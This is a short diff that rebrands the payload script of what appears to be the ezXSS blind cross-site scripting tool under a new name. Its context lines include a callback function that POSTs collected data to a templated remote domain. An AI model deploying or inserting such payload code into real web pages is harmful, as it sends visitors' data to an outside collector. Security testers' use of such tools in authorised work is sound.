@@ -1,5 +1,5 @@
-// github.com/ssl/ezXSS
-// ezXSS {{version}}
+// github.com/vvlcx/Devvx
+// Devvx {{version}}
 
 function ez_n(e){return void 0 !==e?e:''}
 function ez_cb(t,e){var n=new XMLHttpRequest;n.open("POST",("https:"!==location.protocol?"http:":"https:")+"//{{domain}}/callback",!0),n.setRequestHeader("Content-type","text/plain"),n.timeout=6e4,n.onreadystatechange=function(){4===n.readyState&&200===n.status&&null!==e&&e(n.responseText)},n.send(JSON.stringify(t))}
